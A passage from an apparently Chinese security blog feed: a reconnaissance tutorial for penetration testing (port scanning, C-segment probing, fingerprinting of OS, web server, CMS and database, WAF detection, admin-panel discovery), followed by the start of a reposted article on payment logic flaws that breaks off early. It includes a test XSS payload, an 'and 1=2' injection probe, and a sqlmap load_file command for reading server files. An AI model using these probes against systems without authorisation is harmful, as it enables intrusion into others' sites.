    <a href="#10webdirscan" class="header-mark"></a>10、Webdirscan</h2><h2 id="11bbscan" class="headerLink">
    <a href="#11bbscan" class="header-mark"></a>11、BBscan</h2><h2 id="12gsil" class="headerLink">
    <a href="#12gsil" class="header-mark"></a>12、GSIL</h2><h2 id="六端口扫描" class="headerLink">
    <a href="#%e5%85%ad%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" class="header-mark"></a>六、端口扫描</h2><p>通过端口扫描可以判断出网站开启的服务，从而通过爆破枚举或者漏洞利用进行突破，进一步提升网站权限，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。</p>
<p>扫描到的端口也许是网站的一个旁站，可以尝试对旁站进行漏洞探测，但是有些服务开启的端口可能被管理员修改，通过手工判断分析即可（例如开启了8888端口，通过尝试远程桌面连接确定该端口为3389修改过的端口）。</p>
<h2 id="windows下的命令" class="headerLink">
    <a href="#windows%e4%b8%8b%e7%9a%84%e5%91%bd%e4%bb%a4" class="header-mark"></a>windows下的命令</h2><p>显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED ），也包括监听连接请求（LISTENING ）的那些连接，</p>
<p>断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等 ：netstat -a</p>
<p>以数字形式显示地址和端口号,显示所有已建立的有效连接：netstat -n</p>
<p>列出所有端口的情况：netstat -ano</p>
<p>查看被占用端口80对应的应用的PID：netstat -ano|findstr &ldquo;80&rdquo;</p>
<p>查看80端口被哪个进程或程序占用：tasklist|findstr &ldquo;80&rdquo;</p>
<p>结束该进程或程序：taskkill /f /t /im XX.exe</p>
<h2 id="1各服务开启的默认端口以及攻击方向" class="headerLink">
    <a href="#1%e5%90%84%e6%9c%8d%e5%8a%a1%e5%bc%80%e5%90%af%e7%9a%84%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bb%a5%e5%8f%8a%e6%94%bb%e5%87%bb%e6%96%b9%e5%90%91" class="header-mark"></a>1、各服务开启的默认端口以及攻击方向</h2><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png" title="image-20240318224051389" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png">
        
    </a></p>
<h2 id="2在线查询网站" class="headerLink">
    <a href="#2%e5%9c%a8%e7%ba%bf%e6%9f%a5%e8%af%a2%e7%bd%91%e7%ab%99" class="header-mark"></a>2、在线查询网站</h2><p><a href="http://coolaf.com/tool/port" target="_blank" rel="noopener noreferrer">http://coolaf.com/tool/port</a></p>
<p><a href="https://tool.lu/portscan/index.html" target="_blank" rel="noopener noreferrer">https://tool.lu/portscan/index.html</a></p>
<h2 id="3端口扫描工具" class="headerLink">
    <a href="#3%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e5%b7%a5%e5%85%b7" class="header-mark"></a>3、端口扫描工具</h2><p>端口扫描工具常见有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低，如果网站存在WAF可以通过调节扫描线程或者利用FTP连接工具、SSH连接工具、Mysql连接等工具进行手工探测</p>
<h3 id="31nmapzmap" class="headerLink">
    <a href="#31nmapzmap" class="header-mark"></a>3.1、nmap(zmap)</h3><p>Nmap扫描中一些常见的服务</p>
<p>msmq? ：默认对于的是1801端口，是 MSMQ Microsoft Message Queuing微软消息队列的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png" title="image-20240318224248649" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png" title="image-20240318224306226" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png">
        
    </a></p>
<p>msrpc：Microsoft Remote Procedure Call微软远程过程调用，是 Windows 操作系统使用的一个协议。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png" title="image-20240318224314679" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png">
        
    </a></p>
<p>tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png" title="image-20240318224326847" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png">
        
    </a></p>
<p>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-2816d3017e53b6d30098486fd83178454deb36d9.png" title="image-20240318224341790" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-2816d3017e53b6d30098486fd83178454deb36d9.png">
        
    </a></p>
<h3 id="32masscan" class="headerLink">
    <a href="#32masscan" class="header-mark"></a>3.2、masscan</h3><h3 id="33scanport" class="headerLink">
    <a href="#33scanport" class="header-mark"></a>3.3、ScanPort</h3><p>通过ping等方式获取网站IP，然后开始扫描</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png" title="image-20240318224425359" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png">
        
    </a></p>
<h3 id="34webrobot" class="headerLink">
    <a href="#34webrobot" class="header-mark"></a>3.4、webrobot</h3><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png" title="image-20240318224438848" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png">
        
    </a></p>
<h2 id="七旁站c段" class="headerLink">
    <a href="#%e4%b8%83%e6%97%81%e7%ab%99c%e6%ae%b5" class="header-mark"></a>七、旁站C段</h2><p>旁站：是和目标网站在同一台服务器上的其它网站</p>
<p>C端：是和服务器IP处在一个C段的其他服务器</p>
<p>对于防护比较强的主站，通常是很难挖掘到漏洞的，这时需要查看该站点的旁站，通过探测旁站的漏洞进行利用，从而拿下主站的权限。</p>
<p>当网站不存在旁站时，就需要进行C段探测（有些网站买断了相邻的几个IP做为分站，如果拿到分站的管理员敏感信息，如密码之类的，可以尝试对主站进行撞库），通过拿下C段中服务器进行ARP欺骗达到劫持域名的效果</p>
<p>对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</p>
<h2 id="1在线查询" class="headerLink">
    <a href="#1%e5%9c%a8%e7%ba%bf%e6%9f%a5%e8%af%a2" class="header-mark"></a>1、在线查询</h2><h3 id="11站点" class="headerLink">
    <a href="#11%e7%ab%99%e7%82%b9" class="header-mark"></a>1.1、站点</h3><p><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener noreferrer">http://s.tool.chinaz.com/same</a></p>
<p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener noreferrer">https://dns.aizhan.com/</a></p>
<p><a href="http://www.5kik.com/c/" target="_blank" rel="noopener noreferrer"><strong>http://www.5kik.com/c/</strong></a> <strong>？登不上</strong></p>
<p><a href="https://webscan.cc/" target="_blank" rel="noopener noreferrer">https://webscan.cc/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-e279f958bb4899a484b3ce373980e5ec67533039.png" title="image-20240318224505782" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-e279f958bb4899a484b3ce373980e5ec67533039.png">
        
    </a></p>
<h3 id="12google-hackingbing" class="headerLink">
    <a href="#12google-hackingbing" class="header-mark"></a>1.2、Google Hacking、Bing</h3><p>site:125.125.125.*</p>
<p><a href="http://cn.bing.com/search?q=ip:111.111.111.111" target="_blank" rel="noopener noreferrer">http://cn.bing.com/search?q=ip:111.111.111.111</a></p>
<h3 id="12网络空间搜索引擎" class="headerLink">
    <a href="#12%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e" class="header-mark"></a>1.2、网络空间搜索引擎</h3><p>fofa、shodan在线工具 语法:ip=&ldquo;106.15.141.18/24&rdquo;</p>
<h2 id="2探测工具" class="headerLink">
    <a href="#2%e6%8e%a2%e6%b5%8b%e5%b7%a5%e5%85%b7" class="header-mark"></a>2、探测工具</h2><h3 id="21k8cscan" class="headerLink">
    <a href="#21k8cscan" class="header-mark"></a>2.1、K8Cscan</h3><p><a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener noreferrer">https://github.com/k8gege/K8CScan</a></p>
<h3 id="22nmapmasscan" class="headerLink">
    <a href="#22nmapmasscan" class="header-mark"></a>2.2、nmap、masscan</h3><p>nmap -p 22,21,443,8080-Pn 172.178.40.0/24</p>
<p>nmap -p 80,8080 &ndash;open ip/24</p>
<p>masscan -p 22,21,443,8080-Pn &ndash;rate=1000172.178.40.0/24</p>
<h3 id="23goby" class="headerLink">
    <a href="#23goby" class="header-mark"></a>2.3、goby</h3><h3 id="24御剑" class="headerLink">
    <a href="#24%e5%be%a1%e5%89%91" class="header-mark"></a>2.4、御剑</h3><h3 id="25北极熊扫描器" class="headerLink">
    <a href="#25%e5%8c%97%e6%9e%81%e7%86%8a%e6%89%ab%e6%8f%8f%e5%99%a8" class="header-mark"></a>2.5、北极熊扫描器</h3><h3 id="26通过手动ping" class="headerLink">
    <a href="#26%e9%80%9a%e8%bf%87%e6%89%8b%e5%8a%a8ping" class="header-mark"></a>2.6、通过手动ping</h3><h2 id="八整站分析" class="headerLink">
    <a href="#%e5%85%ab%e6%95%b4%e7%ab%99%e5%88%86%e6%9e%90" class="header-mark"></a>八、整站分析</h2><h2 id="1服务器类型" class="headerLink">
    <a href="#1%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%b1%bb%e5%9e%8b" class="header-mark"></a>1、服务器类型</h2><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
<p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png" title="image-20240318224523272" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png">
        
    </a></p>
<p>而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png" title="image-20240318224542950" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png">
        
    </a></p>
<p>检测服务器平台、版本等，获取后可以制定漏洞挖掘方案（如IIS6.0存在解析漏洞等）。</p>
<p>将首页或者其他页面通过修改大小写辨别网站所使用的系统：</p>
<p>区分大小写（页面报错）&ndash;Linux</p>
<p>不区分大小写（页面正常）&ndash;Windows</p>
<h3 id="11-云悉web资产梳理" class="headerLink">
    <a href="#11-%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>1.1、 云悉WEB资产梳理</h3><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png" title="image-20240318224635116" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png">
        
    </a></p>
<p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">http://www.yunsee.cn/</a>，根据IIS版本判断Windows系统，系统对应版本通过搜索引擎查找。</p>
<p><strong>注：使用AppScan、WVS等扫描工具也可以判断。</strong></p>
<h2 id="2网站容器" class="headerLink">
    <a href="#2%e7%bd%91%e7%ab%99%e5%ae%b9%e5%99%a8" class="header-mark"></a>2、网站容器</h2><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
<p>搭建网站的服务组件，例如：iis、Apache、nginx、tomcat等，通过网站容器判断存在的漏洞（如：Apache解析漏洞，nginx解析漏洞）。</p>
<h3 id="21火狐渗透测试浏览器" class="headerLink">
    <a href="#21%e7%81%ab%e7%8b%90%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e6%b5%8f%e8%a7%88%e5%99%a8" class="header-mark"></a>2.1、火狐渗透测试浏览器</h3><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png" title="image-20240318224652100" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png">
        
    </a></p>
<h3 id="22云悉web资产梳理" class="headerLink">
    <a href="#22%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>2.2、云悉WEB资产梳理\</h3><h2 id="23脚本类型" class="headerLink">
    <a href="#23%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>2.3、脚本类型</h2><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
<p>1）可以根据网站URL来判断</p>
<p>2）site:xxx filetype:php</p>
<p>3）可以根据Firefox的插件来判断</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png" title="image-20240318224729502" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png">
        
    </a></p>
<h3 id="31通过修改首页文件后缀查看页面响应判断" class="headerLink">
    <a href="#31%e9%80%9a%e8%bf%87%e4%bf%ae%e6%94%b9%e9%a6%96%e9%a1%b5%e6%96%87%e4%bb%b6%e5%90%8e%e7%bc%80%e6%9f%a5%e7%9c%8b%e9%a1%b5%e9%9d%a2%e5%93%8d%e5%ba%94%e5%88%a4%e6%96%ad" class="header-mark"></a>3.1、通过修改首页文件后缀查看页面响应判断</h3><p>通过修改index.xxx后缀内容（为ASP\ASPX\PHP\JSP），查看页面返回情况，页面返回正常便可以判断脚本类型，判断脚本类型是信息收集中最基本的工作之一。</p>
<h3 id="32通过搜索框查找相关文章辨别脚本类型" class="headerLink">
    <a href="#32%e9%80%9a%e8%bf%87%e6%90%9c%e7%b4%a2%e6%a1%86%e6%9f%a5%e6%89%be%e7%9b%b8%e5%85%b3%e6%96%87%e7%ab%a0%e8%be%a8%e5%88%ab%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>3.2、通过搜索框查找相关文章辨别脚本类型</h3><p>在网站搜索框中输入任意字符，查询后，通过浏览器上的URL判断网站脚本类型。</p>
<h3 id="33通过爬虫工具爬取网站目录判断网站脚本类型" class="headerLink">
    <a href="#33%e9%80%9a%e8%bf%87%e7%88%ac%e8%99%ab%e5%b7%a5%e5%85%b7%e7%88%ac%e5%8f%96%e7%bd%91%e7%ab%99%e7%9b%ae%e5%bd%95%e5%88%a4%e6%96%ad%e7%bd%91%e7%ab%99%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>3.3、通过爬虫工具爬取网站目录判断网站脚本类型</h3><p>Webrobot</p>
<h2 id="4cms类型" class="headerLink">
    <a href="#4cms%e7%b1%bb%e5%9e%8b" class="header-mark"></a>4、CMS类型</h2><p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。这是我们想要识别这些网站的指纹，我们就可以利用以下一些指纹识别在线网站。</p>
<p>识别dedecms、phpcms、emlog、帝国cms等，通过网站使用的CMS找取该CMS已经公布的漏洞进行利用，进一步渗透网站。</p>
<h3 id="41云悉指纹" class="headerLink">
    <a href="#41%e4%ba%91%e6%82%89%e6%8c%87%e7%ba%b9" class="header-mark"></a>4.1、云悉指纹</h3><p><a href="https://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">https://www.yunsee.cn/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png" title="image-20240318224745687" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png">
        
    </a></p>
<h3 id="42threatscan" class="headerLink">
    <a href="#42threatscan" class="header-mark"></a>4.2、ThreatScan</h3><p><a href="https://scan.top15.cn/web/" target="_blank" rel="noopener noreferrer">https://scan.top15.cn/web/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-039eb6b513752749827e5cb1921b6209396d953d.png" title="image-20240318224806210" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-039eb6b513752749827e5cb1921b6209396d953d.png">
        
    </a></p>
<h3 id="43wappalyzer" class="headerLink">
    <a href="#43wappalyzer" class="header-mark"></a>4.3、wappalyzer</h3><p><a href="https://www.wappalyzer.com/" target="_blank" rel="noopener noreferrer">https://www.wappalyzer.com/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png" title="image-20240318224818148" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png">
        
    </a></p>
<h3 id="44whatweb" class="headerLink">
    <a href="#44whatweb" class="header-mark"></a>4.4、WhatWeb</h3><p><a href="https://whatweb.net/" target="_blank" rel="noopener noreferrer">http://whatweb.net/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-4917e9369baabdd749819b421843aa40762ffdd7.png" title="image-20240318224833360" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-4917e9369baabdd749819b421843aa40762ffdd7.png">
        
    </a></p>
<h3 id="45bugscaner" class="headerLink">
    <a href="#45bugscaner" class="header-mark"></a>4.5、BugScaner</h3><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener noreferrer">http://whatweb.bugscaner.com/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-11f6d51361219f0834c539d6696031840bb53fd2.png" title="image-20240318224842513" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-11f6d51361219f0834c539d6696031840bb53fd2.png">
        
    </a></p>
<h3 id="46潮汐指纹" class="headerLink">
    <a href="#46%e6%bd%ae%e6%b1%90%e6%8c%87%e7%ba%b9" class="header-mark"></a>4.6、潮汐指纹</h3><p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener noreferrer">http://finger.tidesec.net/</a></p>
<h2 id="5数据库类型" class="headerLink">
    <a href="#5%e6%95%b0%e6%8d%ae%e5%ba%93%e7%b1%bb%e5%9e%8b" class="header-mark"></a>5、数据库类型</h2><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的</p>
<p>各端口对应数据库类型：</p>
<p><strong>sql server&ndash;1433</strong></p>
<p><strong>oracle&ndash;1521</strong></p>
<p><strong>mysql&ndash;3306</strong></p>
<p><strong>postgresql&ndash;5432</strong></p>
<p><strong>access&ndash;默认不开放连接端口，数据库存储在FTP服务器上。</strong></p>
<p>几种数据库的区别：</p>
<p>Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库</p>
<p>SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf</p>
<p>MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306</p>
<p>Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521</p>
<p>首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。</p>
<p>通常情况：access&ndash;asp mysql&ndash;php oracle&ndash;jsp sqlserver&ndash;aspx</p>
<p>postgresql&ndash;php，常见搭配：</p>
<p>ASP 和 ASPX：ACCESS、SQL Server</p>
<p>PHP：MySQL、PostgreSQL</p>
<p>JSP：Oracle、MySQL</p>
<p>端口扫描判断数据库类型的方法较为准确，但是管理员也可能选择不开放外网数据库端口，开放内网的数据库端口，也有些管理员喜欢使用站库分离的方法或者使用WAF进行拦截端口扫描来防护站点，这样我们通过端口扫描判断数据库类型的方法便有些失效了。</p>
<h2 id="6waf" class="headerLink">
    <a href="#6waf" class="header-mark"></a>6、WAF</h2><p>判断安全狗、阿里云云盾、360网站卫士、护卫神等WEB应用程序防火墙，便于采取绕过WAF的办法。</p>
<p>Nmap探测WAF有两种脚本。</p>
<p>一种是http-waf-detect。</p>
<p>命令：nmap -p80,443 &ndash;script=http-waf-detect ip</p>
<p>一种是http-waf-fingerprint。</p>
<p>命令：nmap -p80,443 &ndash;script=http-waf-fingerprint ip</p>
<p>WAFW00F探测WAF</p>
<p>命令：wafw00f -a 域名</p>
<h3 id="61在线资产识别" class="headerLink">
    <a href="#61%e5%9c%a8%e7%ba%bf%e8%b5%84%e4%ba%a7%e8%af%86%e5%88%ab" class="header-mark"></a>6.1、在线资产识别</h3><p>云悉WEB资产梳理</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png" title="image-20240318224859531" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png">
        
    </a></p>
<h3 id="62手动检测是拦截页面或者http可识别字段" class="headerLink">
    <a href="#62%e6%89%8b%e5%8a%a8%e6%a3%80%e6%b5%8b%e6%98%af%e6%8b%a6%e6%88%aa%e9%a1%b5%e9%9d%a2%e6%88%96%e8%80%85http%e5%8f%af%e8%af%86%e5%88%ab%e5%ad%97%e6%ae%b5" class="header-mark"></a>6.2、手动检测是拦截页面或者HTTP可识别字段</h3><p>在搜索框中输入XSS弹窗代码<script>alert(&lsquo;XSS&rsquo;)</script> ，WAF拦截后判断WAF。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png" title="image-20240318224910129" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png">
        
    </a></p>
<p>在可能存在的注入页面输入检测注入漏洞代码and 1=2，被WAF拦截后判断WAF。</p>
<h2 id="九后台查找" class="headerLink">
    <a href="#%e4%b9%9d%e5%90%8e%e5%8f%b0%e6%9f%a5%e6%89%be" class="header-mark"></a>九、后台查找</h2><p>·1弱口令默认后台：admin，admin/login.asp，manage，login.asp等等常见后台</p>
<p>·2查看网页的链接；一般来说，网站的主页有管理登陆类似的东西，大多数在网站底部版权处或鲁在冒页导肌程等，有些可能被管理员删掉</p>
<p>·3查看网站图片的属性有可能图片是上传大管理后台目录，但是是在前台显示</p>
<p>·4查看网站使用的管理系统，从而确定后台</p>
<p>·5用工具查找：wwwscan，intellitamper，御剑，进行爬虫、字典穷举扫描</p>
<p>·6robots.txt的帮助：robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看</p>
<p>·7 GoogleHacker通过语法查找后台</p>
<p>·8查看网站使用的编辑器是否有默认后台，FCK、ewb等默认后台</p>
<p>·9短文件利用短文件漏洞进行猜解</p>
<p>·10、子域名有可能管理后台为admin.xxxxx.com、login.xxxxx.com</p>
<p>·11sqlmap-sql-shell load_file（&rsquo;d:/wwroot/index.php&rsquo;）；利用sql注入查看文件源码获取后台</p>
<p>·12社工、XSS利用社会工程系获取后台，利用存储型XSs获取后台</p>]]></description>
</item><item>
    <title>支付类漏洞挖掘技巧总结</title>
    <link>https://www.bysec.cn/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</link>
    <pubDate>Fri, 22 Mar 2024 18:22:32 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2778" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2778</a></em></p>
</blockquote>
<h2 id="前言" class="headerLink">
    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言：</h2><p>支付类逻辑漏洞在漏洞挖掘中是常常出现的问题之一。此类漏洞挖掘思路多，奖励高，是炙手可热的漏洞。此篇文章主要围绕挖掘支付逻辑漏洞时的一些思路分享。</p>
<h2 id="支付逻辑漏洞成因" class="headerLink">
    <a href="#%e6%94%af%e4%bb%98%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" class="header-mark"></a>支付逻辑漏洞成因：</h2><p>支付漏洞可能由以下原因造成：</p>
<ol>
<li>前端验证不充分：在前端页面上，没有进行足够的验证和限制，使得用户可以通过修改页面元素或发送自定义请求来篡改支付金额、支付类型、支付状态等。</li>
<li>客户端数据不可信：客户端（如移动应用）在进行支付时，没有对传输的数据进行完整性验证和加密，导致恶意用户可以直接修改数据包中的支付金额、订单号等与订单有关的参数。</li>
<li>服务器端验证不严格：支付请求在到达服务器端时，没有进行足够的验证和校验，使得攻击者能够更改支付相关参数并绕过服务器端的验证机制。</li>
<li>不安全的存储和传输：支付金额数据在存储或传输过程中未经适当的加密保护，导致黑客可以窃取或篡改数据。</li>
</ol>
<h2 id="支付逻辑漏洞挖掘技巧" class="headerLink">
    <a href="#%e6%94%af%e4%bb%98%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e6%8a%80%e5%b7%a7" class="header-mark"></a>支付逻辑漏洞挖掘技巧：</h2><p>在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类：</p>
<h4 id="一更改支付金额" class="headerLink">
